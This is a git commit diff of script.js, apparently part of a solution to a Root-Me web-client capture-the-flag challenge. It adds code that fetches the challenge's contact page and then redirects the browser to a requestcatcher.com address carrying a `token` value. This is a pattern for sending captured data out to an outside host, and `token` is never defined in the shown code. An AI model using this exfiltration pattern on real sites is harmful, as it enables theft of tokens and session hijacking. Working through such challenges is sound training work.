82bdbd4c1b773585f975d2fb37a55b44a304086a
fullgitstack <mackormack0@gmail.com>
2025-10-02 22:56:43 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,9 @@
 const fn = async () => {
+const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact');
+const resp = await req.text();
 
 
-
-window.location.href = `https://tyyhty.requestcatcher.com/hello2`
+window.location.href = `https://tyyhty.requestcatcher.com/${token}`
 
 
 
